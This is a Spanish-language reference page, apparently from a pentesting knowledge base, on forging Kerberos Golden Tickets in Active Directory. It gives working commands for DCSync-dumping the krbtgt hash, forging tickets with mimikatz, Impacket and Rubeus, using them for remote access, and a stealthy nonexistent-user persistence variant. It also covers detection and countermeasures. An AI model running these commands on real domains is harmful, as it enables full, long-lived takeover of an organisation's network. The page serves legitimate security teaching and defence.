---
title: Golden Ticket
slug: golden-ticket
aliases: [Golden Ticket, krbtgt forge, TGT forging, mimikatz golden, ticketer golden, Domain Persistence Kerberos]
fase: [Post-Explotación]
plataforma: Windows
dificultad: Avanzada
mitre: [T1558.001]
related: [silver-ticket, pass-the-ticket, credential-dumping, persistencia-windows, ejecucion-remota-windows, enumeracion-kerberos]
learning_refs: []
---

# Golden Ticket

## Descripción
Forja de un Ticket Granting Ticket (TGT) arbitrario firmado con la clave secreta de la cuenta `krbtgt` del dominio. Como el KDC valida cualquier TGT cuya firma coincida con el hash de `krbtgt`, un atacante con ese hash puede emitir tickets para cualquier identidad (incluso usuarios inexistentes), con cualquier pertenencia a grupos (Domain Admins, Enterprise Admins), y con cualquier validez (típicamente 10 años por default en mimikatz). El TGT forjado bypassa completamente el flujo AS-REQ/AS-REP: el KDC nunca emite el ticket, el atacante lo construye localmente. Es una de las técnicas de persistencia más graves en Active Directory: rotar `krbtgt` requiere DOS resets consecutivos (separados por ≥10 horas) y la mayoría de organizaciones nunca lo hacen, así que un Golden Ticket suele sobrevivir años.

## Herramientas
- **mimikatz** (`kerberos::golden`) — herramienta canónica para forja de tickets, runs en Windows
- **Impacket** (`ticketer.py`) — equivalente desde Linux, escribe el ticket en formato ccache
- **Rubeus** (`golden`) — alternativa moderna a mimikatz en .NET, menos detectada por AV
- **secretsdump.py** (Impacket) — para extraer el hash de `krbtgt` previo a la forja (DCSync)

## Comandos / Ejemplos

### Pre-requisito: extraer el hash NTLM de krbtgt vía DCSync
```bash
# Desde Linux con cuenta que tenga permisos de DCSync (Domain Admin, replicación)
impacket-secretsdump corp.local/dadmin:'Password!'@10.10.10.10 -just-dc-user krbtgt
# Output: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<HASH_NTLM_KRBTGT>:::
# El hash AES también se puede usar (más difícil de detectar): -just-dc + grep krbtgt
```

### Forja con mimikatz (Windows)
```
# Necesario: SID del dominio + hash NTLM de krbtgt
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:e3c61a68f1b89ee6c8ba9507378dc88d /ptt
# /ptt inyecta el ticket en la sesión actual; alternativa: /ticket:golden.kirbi para guardarlo

# Verificar
mimikatz # misc::cmd
C:\> klist
C:\> dir \\dc01.corp.local\c$    # acceso administrativo confirmado

# Variante con AES-256 (más sigilosa, no usa RC4 que es flag de Kerberoasting)
mimikatz # kerberos::golden /user:fakeuser /domain:corp.local /sid:S-1-5-21-... /aes256:<AES256_KEY> /ptt
```

### Forja con Impacket ticketer (Linux)
```bash
# Generar ticket en formato ccache
impacket-ticketer -nthash e3c61a68f1b89ee6c8ba9507378dc88d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator

# Cargar ccache en variable de entorno
export KRB5CCNAME=Administrator.ccache

# Usar el ticket para acción remota
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
impacket-secretsdump -k -no-pass corp.local/Administrator@dc01.corp.local
```

### Forja con Rubeus (Windows, alternativa moderna)
```powershell
# Forja en memoria + inyección automática
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /rc4:e3c61a68f1b89ee6c8ba9507378dc88d /ptt

# Con AES-256 (preferido)
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:<AES256> /ptt /nowrap
```

### Persistencia silenciosa: Golden Ticket con usuario inexistente
```
# Forjar ticket para un usuario que NO existe en el dominio. El KDC no detecta esto
# porque sólo valida la firma del TGT, no la existencia del principal en el AD.
mimikatz # kerberos::golden /user:NonExistentUser /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500 /groups:512,513,518,519,520 /ptt
# id:500 = RID de Administrator; groups: Domain Admins (512), Enterprise Admins (519), etc.
```

## Contramedidas
- **Rotación doble de krbtgt**: ejecutar `Reset-KrbtgtKeyInteractive.ps1` (Microsoft) DOS veces con ≥10 horas entre resets (si se hace una sola vez, los TGTs forjados con la clave anterior siguen siendo válidos)
- Restringir DCSync (replicación de directorio): sólo Domain Controllers deben tener `DS-Replication-Get-Changes-All`. Auditar miembros vía PowerView `Get-DomainObjectAcl -SearchBase "DC=corp,DC=local" -ResolveGUIDs`
- Detección por anomalía: TGT con tiempo de vida absurdo (10 años) destaca contra el default Kerberos (10 horas). Eventos 4768 (TGT issuance) revisan ticket lifetime
- Detectar tickets sin AS-REQ previo: TGT que aparece en logs de uso (Event ID 4624) sin un Event ID 4768 emisor en el DC indica forja
- Microsoft Defender for Identity tiene detección específica de Golden Ticket en su feature "Suspected Golden Ticket usage"
- Reducir el blast radius: tier 0 administration estricto, no usar Domain Admins fuera de DCs
- Habilitar el "Protected Users" group para cuentas privilegiadas (no se les emite TGT con RC4, ticket lifetime reducido)
- Monitorear Event ID 4624 con LogonType 3 desde IPs internas no esperadas con cuenta de usuario que en condiciones normales no genera tráfico

## Referencias
- MITRE Corporation. (2024). *ATT&CK Technique T1558.001: Steal or Forge Kerberos Tickets: Golden Ticket*. https://attack.mitre.org/techniques/T1558/001/
- gentilkiwi. (s.f.). *mimikatz* [Software]. GitHub. https://github.com/gentilkiwi/mimikatz
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- GhostPack. (s.f.). *Rubeus* [Software]. GitHub. https://github.com/GhostPack/Rubeus
- Microsoft. (2023). *Reset the Kerberos Key Distribution Center service account password*. https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-reset-krbtgt
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
